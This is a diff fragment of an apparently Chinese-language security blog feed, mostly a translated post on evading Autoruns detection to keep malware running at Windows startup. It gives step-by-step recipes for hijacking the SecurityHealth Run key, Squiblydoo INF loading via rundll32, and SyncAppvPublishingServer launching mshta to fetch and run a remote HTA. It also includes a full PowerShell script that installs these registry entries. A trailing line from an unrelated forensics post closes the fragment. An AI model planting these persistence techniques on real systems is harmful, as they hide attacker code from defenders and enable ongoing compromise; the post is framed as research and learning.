-&lt;p&gt;有UAC提示欸。那數字簽名呢？&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/NAnpHet.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;悲劇，這對於Windows 10來說並不可行。我建議你在Windows 7或更舊版本上使用這種技術，如果你想實踐它的話。我無法在Windows 7和Windows 10上通過autoruns註冊表項運作。這在演講中聽起來很套路很經典，但我猜這在實踐中是兩碼子事。&lt;/p&gt;
-
-&lt;h1 id=&quot;syncappvpublishingexe自動運行技術&quot;&gt;&lt;strong&gt;SyncAppvPublishing.exe自動運行技術&lt;/strong&gt;&lt;/h1&gt;
-&lt;p&gt;讓我們接著進入這一個主題。它用一張投影片說明了一切。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/dLufm6K.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;看起來很簡單，讓我們嘗試透過添加一個註冊表項到我們的Windows 10虛擬機。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/15Pd1z4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;為了calc，現在我們需要重新啟動Windows 10虛擬機。為了武裝這個，我們可以把它改成各種內建的工具。例如，regsvr32.exe或mshta.exe。有很多選項可以使其自立更生(live off the land)。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/B2vkbS8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;好耶，這個技術可以成功運作耶！&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://blog.conscioushacker.io/wp-content/uploads/2017/10/celery.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;教程&quot;&gt;&lt;strong&gt;教程&lt;/strong&gt;&lt;/h1&gt;
-&lt;p&gt;&lt;strong&gt;擴展搜索順序自動運行技術&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Windows 7&lt;/strong&gt;&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Generate a COM scriptlet payload&lt;/li&gt;
-  &lt;li&gt;Modify existing registry key to load your COM scriptlet instead of the executable.
-    &lt;ul&gt;
-      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealth (REG_EXPAND_SZ) – C:\Program Files\Windows Defender\MSASCui&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Place your COM payload in C:\Program Files\Windows Defender\ as “MSASCui.com”&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;strong&gt;Windows 10&lt;/strong&gt;&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Generate a COM scriptlet payload&lt;/li&gt;
-  &lt;li&gt;Modify existing registry key to load your COM scriptlet instead of the executable.
-    &lt;ul&gt;
-      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealth (REG_EXPAND_SZ) – C:\Program Files\Windows Defender\MSASCuiL&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Place your COM payload in C:\Program Files\Windows Defender\ as “MSASCuiL.com”&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;strong&gt;Squiblydoo INF自動運行技術&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Windows 7&lt;/strong&gt;&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Generate a COM scriptlet payload&lt;/li&gt;
-  &lt;li&gt;Modify the “INF” file: https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf&lt;/li&gt;
-  &lt;li&gt;Add registry key to load your INF file.
-    &lt;ul&gt;
-      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealth (REG_EXPAND_SZ) – “rundll32.exe setupapi,InstallHinfSection ModelsSection 128 shady.inf”&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Place your INF payload in C:\Windows\system32.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;strong&gt;Windows 10 (Not recommended due to digital signature warning and UAC)&lt;/strong&gt;&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Generate a COM scriptlet payload&lt;/li&gt;
-  &lt;li&gt;Modify the “INF” file: https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf&lt;/li&gt;
-  &lt;li&gt;Add registry key to load your INF file.
-    &lt;ul&gt;
-      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WhateverYouWant(REG_EXPAND_SZ) – “rundll32.exe setupapi,InstallHinfSection ModelsSection 128 shady.inf”&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Place your INF payload in C:\Windows\system32.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;strong&gt;InfDefaultInstall.exe自動運行技術 (Does not work)&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Windows 7&lt;/strong&gt;&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Generate a COM scriptlet payload&lt;/li&gt;
-  &lt;li&gt;Modify the “INF” file: https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf&lt;/li&gt;
-  &lt;li&gt;Add registry key to load your INF file.
-    &lt;ul&gt;
-      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WhateverYouWant(REG_EXPAND_SZ) – “InfDefaultInstall.exe shady.inf”&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Place your INF payload in C:\Windows\system32.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;strong&gt;Windows 10 (Not recommended due to digital signature warning and UAC&lt;/strong&gt;)&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Generate a COM scriptlet payload&lt;/li&gt;
-  &lt;li&gt;Modify the “INF” file: https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf&lt;/li&gt;
-  &lt;li&gt;Add registry key to load your INF file.
-    &lt;ul&gt;
-      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WhateverYouWant(REG_EXPAND_SZ) – “InfDefaultInstall.exe shady.inf”&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Place your INF payload in C:\Windows\system32.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;strong&gt;SyncAppvPublishing.exe自動運行技術&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Windows 10&lt;/strong&gt;&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Generate a “living off the land” payload
-    &lt;ul&gt;
-      &lt;li&gt;i.e. mshta.exe https://blog.conscioushacker.io/testaroo.hta&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Add registry key to execute your payload.
-    &lt;ul&gt;
-      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WhateverYouWant(REG_EXPAND_SZ) – ‘SyncAppvPublishingServer.exe “.; Start-Process mshta.exe https://blog.conscioushacker.io/testaroo.hta”‘&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h1 id=&quot;autoruns-powershell-script&quot;&gt;&lt;strong&gt;AutoRuns Powershell Script&lt;/strong&gt;&lt;/h1&gt;
-&lt;p&gt;這個&lt;a href=&quot;https://gist.github.com/ConsciousHacker/aa8d4eb96005b8ab954b1287787a9be4&quot;&gt;腳本&lt;/a&gt;應該可以寫得更動態，不過反正能運行嘛，將就用唄。&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;#
-    AutoRuns v1.0
-    License: GPLv3
-    Author: @ConsciousHacker
-    Credits: @HuntressLabs
-    References: https://github.com/huntresslabs/evading-autoruns
-#&amp;gt;
-
-function InstallAutoRuns-COM
-{
-	#Place your com scriptlet in C:\Program Files\Windows Defender\ as &quot;MSASCuiL.com&quot;
-	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
-	$FakeProgramName = &quot;SecurityHealth&quot;
-	$ComScriptlet = '&quot;C:\Program Files\Windows Defender\MSASCui&quot;'
-
-	Set-ItemProperty -Path $Autoruns -Name $FakeProgramName -Value $ComScriptlet -Type ExpandString
-
-
-}
-
-function UninstallAutoRuns-COM
-{
-	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
-	$FakeProgramName = &quot;SecurityHealth&quot;
-	$ComScriptlet = '&quot;C:\Program Files\Windows Defender\MSASCui.exe&quot;'
-
-	Set-ItemProperty -Path $Autoruns -Name $FakeProgramName -Value $ComScriptlet -Type ExpandString
-}
-
-function InstallAutoRuns-INFDefaultInstall
-{
-	param
-		(
-			[Parameter(Mandatory = $True)]
-			[string]$Path
-		)
-	# Example inf here: https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf
-	# TODO: Generate inf file
-	# TODO: param for registry key name
-	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
-	$infpath = $Path
-	$infdefaultinstall = &quot;INF Default Install&quot;
-	$ComScriptlet = '&quot;C:\Windows\system32\infdefaultinstall.exe ' + $infpath + '&quot;'
-
-	Set-ItemProperty -Path $Autoruns -Name $infdefaultinstall -Value $ComScriptlet -Type ExpandString
-}
-
-function UninstallAutoRuns-INFDefaultInstall
-{
-	param
-		(
-			[Parameter(Mandatory = $True)]
-			[string]$Path
-		)
-
-	# TODO: param for registry key name
-	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
-	$infpath = $Path
-	$infdefaultinstall = &quot;INF Default Install&quot;
-
-	Remove-ItemProperty -Path $Autoruns -Name $infdefaultinstall
-}
-
-function InstallAutoRuns-SquiblydooINF
-{
-	param
-		(
-			[Parameter(Mandatory = $True)]
-			[string]$Path
-		)
-	# Example inf here: https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf
-	# TODO: Generate inf file
-	# TODO: param for registry key name
-	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
-	$infpath = $Path
-	$infdefaultinstall = &quot;Squiblydoo&quot;
-	$ComScriptlet = '&quot;C:\Windows\system32\rundll32.exe setupapi,InstallHinfSection ModelsSection 128 ' + $infpath + '&quot;'
-
-	Set-ItemProperty -Path $Autoruns -Name $infdefaultinstall -Value $ComScriptlet -Type ExpandString
-}
-
-function UninstallAutoRuns-SquiblydooINF
-{
-	param
-		(
-			[Parameter(Mandatory = $True)]
-			[string]$Path
-		)
-
-	# TODO: param for registry key name
-	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
-	$infpath = $Path
-	$infdefaultinstall = &quot;Squiblydoo&quot;
-
-	Remove-ItemProperty -Path $Autoruns -Name $infdefaultinstall
-}
-
-function InstallAutoRuns-SyncAppvPublishing
-{
-	param
-		(
-			[Parameter(Mandatory = $True)]
-			[string]$Cmd
-		)
-	$SyncAppvPublishing = '&quot;C:\Windows\system32\SyncAppvPublishingServer.exe&quot;.; ' + $Cmd + '&quot;&quot;'
-	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
-
-	Set-ItemProperty -Path $Autoruns -Name &quot;SyncAppvPublishing&quot; -Value $SyncAppvPublishing -Type ExpandString
-
-}
-
-function UninstallAutoRuns-SyncAppvPublishing
-{
-	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
-	Remove-ItemProperty -Path $Autoruns -Name &quot;SyncAppvPublishing&quot;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;學習總結&quot;&gt;&lt;strong&gt;學習總結&lt;/strong&gt;&lt;/h1&gt;
-&lt;p&gt;我需要花更多的時間學習和撰寫PowerShell。這個腳本效率很差，它應可更加動態。另外，做研究的人並不總是可以回答問題的答案，所以我在12天前通過Twitter DM聯繫了Kyle，詢問有關“InfDefaultInstall.exe”和“Squiblydoo INF”持久性技術的問題，但他至今未回OAQ。
-你所能做的最好防禦是充分理解此研究並將其應用到實務中。記錄你的探索旅程也很有幫助，我希望有人比我更聰明，可以填補這裡的技術空白。
-&lt;img src=&quot;https://i.imgur.com/AdAagPV.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;來源                                                                                                                                                    &lt;br /&gt;
-&lt;a href=&quot;https://twitter.com/chrisbisnett&quot;&gt;Chris Bisnett (@chrisbisnett)&lt;/a&gt;                  &lt;br /&gt;
-&lt;a href=&quot;https://twitter.com/KyleHanslovan&quot;&gt;Kyle Hanslovan (@KyleHanslovan)&lt;/a&gt;&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="exploit" /><category term="vulnerability" /><summary type="html">by lopi 2017年10月25日發布</summary></entry></feed>
+&lt;p&gt;更多像我此次提出的反饋正是使資安社群成為更為美好聚集地的一部分。我的目標是不公開任何人的.onion服務，這就是為什麼我清理了所有的屏幕截圖，但在上述截圖情況應非實際位址，但根據網站的內容以及解析器分析的IP地址與我預計的託管位置其實是內聯的，所以我相信它非常接近主機伺服器了。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="forensics" /><summary type="html">發佈於2017年11月23日</summary></entry></feed>
